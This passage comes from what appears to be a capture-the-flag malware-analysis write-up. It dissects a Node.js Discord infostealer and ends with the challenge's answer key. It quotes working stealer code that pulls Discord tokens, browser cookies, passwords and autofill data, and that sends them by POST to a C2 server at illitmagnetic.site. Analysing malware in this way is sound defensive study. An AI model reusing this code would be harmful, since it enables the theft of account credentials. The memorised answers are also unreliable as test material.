        if(existsSync(path) && existsSync(join(path, '..', '..', 'Local State'))) {
            for(const file of readdirSync(path)) {
                if(file?.endsWith('.ldb')  || file?.endsWith('.log')) {
                    if(!existsSync(join(path, file))) return;

```

It uses regex to looks for tokens:

```

                    file_content?.forEach((line) => {
                        const encrypted_tokens = line?.match(/dQw4w9WgXcQ:[^.*['(.*)'\].*$][^']*/gi);

```

It uses the Windows DPAPI (per user encryption) to decrypt them. t also makes a call to `stealFirefoxTokens` (see next section) and adds the result the the collection of tokens. Once that’s complete, it exfils them:

```

    const valid_tokens = [];
    for(const value of merge(tokens_list, firefox_tokens)) {
        const token_data = await checkToken(value?.token);

        if(token_data?.id) {
            const user_data = await tokenRequests(value?.token, token_data?.id);
            if(!valid_tokens.find((u) => u?.user?.data?.id === token_data.id)) {
                valid_tokens.push({
                    token: value?.token,
                    found_at: value?.found_in,
                    auth_tag_length: value?.auth_tag_length,
                    crypto_iv: value?.crypto_iv,
                    user: {
                        data: token_data,
                        profile: user_data?.profile,
                        payment_sources: user_data?.payment_sources
                    }
                });
            };
        };
    };

```

#### Collect Tokens From Firefox

In the `getDiscordTokens` call, it also makes a call to `stealFirefoxTokens`:

```

async function stealFirefoxTokens() {
    const path = join(process.env.APPDATA, 'Mozilla', 'Firefox', 'Profiles');
    const tokens_list = [];

    if(existsSync(path)) {
        try {
            const files = execSync('where /r . *.sqlite', { cwd: path })?.toString()
            ?.split(/\r?\n/);
    
            files?.forEach((file) => {
                file = file?.trim();
                if(existsSync(file) && statSync(file)?.isFile()) {
                    const lines = readFileSync(file, 'utf8')
                    ?.split('\n')?.map(x => x?.trim());
    
                    for(const regex of [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)]) {
                        lines?.forEach((line) => {
                            const tokens = line?.match(regex);
                            if(tokens) {
                                tokens?.forEach((token) => {
                                    if (
                                        !token?.startsWith('NzY') &&
                                        !token?.startsWith('NDk') &&
                                        !token?.startsWith('MTg') &&
                                        !token?.startsWith('MjI') &&
                                        !token?.startsWith('MzM') &&
                                        !token?.startsWith('NDU') &&
                                        !token?.startsWith('NTE') &&
                                        !token?.startsWith('NjU') &&
                                        !token?.startsWith('NzM') &&
                                        !token?.startsWith('ODA') &&
                                        !token?.startsWith('OTk') &&
                                        !token?.startsWith('MTA') &&
                                        !token?.startsWith('MTE')
                                      ) return;
                                      if(!tokens_list?.find((t) => t?.token === token)) {
                                        tokens_list?.push({
                                            token: token,
                                            found_in: 'Firefox'
                                        });
                                      }
                                });
                            };
                        });
                    };
                };
            });
        } catch(e) {
            console.log(e);
        };

    return tokens_list;
   };
};

```

It uses `where /r . *.sqlite` to find SQLite DBs and then uses regex to look for tokens in the binary files.

### Browser Data

#### allBrowserData

The final call from the main block is to `allBrowserData`, which starts by trying to kill any browser processes:

```

        await kill([
            'chrome', 'msedge', 'brave', 'firefox', 'opera', 'kometa', 'orbitum', 'centbrowser', '7star', 'sputnik', 'vivaldi',
            'epicprivacybrowser', 'uran', 'yandex', 'iridium'
         ]);

```

Then it calls three functions asynchronously:

```

        const promises = await Promise.allSettled([
            getBrowserCookies(),
            getBrowserAutofills(),
            getBrowserPasswords()
        ]);

```

Then it exfils the results:

```

        await fetch(options.api + 'browsers-data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                duvet_user: options?.user_id,
                computer_name: userInfo()?.username,
                data: {
                    cookies: promisses?.[0]?.value?.cookies_list,
                    autofills: promisses?.[1]?.value,
                    passwords: promisses?.[2]?.value
                }
            })
        });

```

#### Browser Cookies

`getBrowserCookies` gets a list of paths from the C2 and loops over them. If “firefox” is in the path, it calls `getFirefoxCookies(path)`, and otherwise `browserCookies(path)`.

In `browserCookies`, it looks for a `Cookies` file and opens it as a SQLite DB:

```

                const database = new Database(join(path, 'Network', 'Cookies'));
                if(!database) return;

                database.each('SELECT * from cookies', async function (err, row) { 

```

There’s a lot of code to decrypt these cookies, and they are returned.

`getFirefoxCookies` uses the `where /r . cookies.sqlite` command to find the file (Task 12):

```

async function getFirefoxCookies(path) {
    const cookies = [];
    if(existsSync(path)) {
        try {
            const cookiesFile = execSync('where /r . cookies.sqlite', { cwd: path })?.toString();

            if(!cookiesFile) return;
            if(!existsSync(join(cookiesFile?.trim()))) return;
            const result = await new Promise((res, rej) => {
                const database = new Database(cookiesFile?.trim())
                if(!database) return;
    
                database.each('SELECT * FROM moz_cookies', async function(err, row) {
                    if(!row?.value) return;
                    if(cookies?.find((c) => c?.browser === 'Firefox')) {
                        cookies?.find((c) => c?.browser === 'Firefox')?.list?.push(`${row?.host}\t${row?.expiry === 0 ? 'FALSE' : 'TRUE'}\t${row?.path}\t${row?.host?.startsWith('.') ? 'FALSE' : 'TRUE'}\t${row?.expiry}\t${row?.name}\t${row?.value}`);
                    } else {
                        cookies?.push({ browser: 'Firefox', list: [`${row?.host}\t${row?.expiry === 0 ? 'FALSE' : 'TRUE'}\t${row?.path}\t${row?.host?.startsWith('.') ? 'FALSE' : 'TRUE'}\t${row?.expiry}\t${row?.name}\t${row?.value}`]});
                    };
                }, function () {
                    res(cookies);
                    database?.close();
                });
            });

            return result;
        } catch(e) {
            console.log(e)
        };
    };
};

```

It collects them from the DB and returns them.

#### Autofills and Passwords

The `getBrowserAutofills` and `getBrowserPasswords` are similar. They each look for a database and open it up, sending back the results. Interestingly, neither of these try to check in Firefox, only the other browsers (which are all Chromium-based).

## Results

### Features
- Trojan Discord’s core module.
- Exfil information about the victim computer.
- Collect Discord tokens.
- Collect cookies from all major browsers.
- Collect saved passwords from Chromium-based browsers.
- Collect autofill data from Chromium-based browsers.

### Question Answers
1. What is the Imphash of this malware installer?

   b34f154ec913d2d2c435cbd644e91687
2. The malware contains a digital signature. What is the program name specified in the `SpcSpOpusInfo` Data Structure?

   Windows Update Assistant
3. The malware uses a unique GUID during installation, what is this GUID?

   cfbc383d-9aa0-5771-9485-7b806e8442d5
4. The malware contains a package.json file with metadata associated with it. What is the ‘License’ tied to this malware?

   ISC
5. The malware connects back to a C2 address during execution. What is the domain used for C2?

   illitmagnetic.site
6. The malware attempts to get the public IP address of an infected system. What is the full URL used to retrieve this information?

   `https://ipinfo.io/json`
7. The malware is looking for a particular path to connect back on. What is the full URL used for C2 of this malware?

   `https://illitmagnetic.site/api/`
8. The malware has a configured `user_id` which is sent to the C2 in the headers or body on every request. What is the key or variable name sent which contains the user\_id value?

   `duvet_user`
9. The malware checks for a number of hostnames upon execution, and if any are found it will terminate. What hostname is it looking for that begins with `arch`?

   archibaldpc
10. The malware looks for a number of processes when checking if it is running in a VM; however, the malware author has mistakenly made it check for the same process twice. What is the name of this process?

    vmwaretray
11. The malware has a special function which checks to see if `C:\Windows\system32\cmd.exe` exists. If it doesn’t it will write a file from the C2 server to an unusual location on disk using the environment variable `USERPROFILE`. What is the location it will be written to?

    `%USERPROFILE%\Documents\cmd.exe`
12. The malware appears to be targeting browsers as much as Discord. What command is run to locate Firefox cookies on the system?

    `where /r . cookies.sqlite`
13. To finally eradicate the malware, Forela needs you to find out what Discord module has been modified by the malware so they can clean it up. What is the Discord module infected by this malware, and what’s the name of the infected file?

    discord\_desktop\_core-1,index.js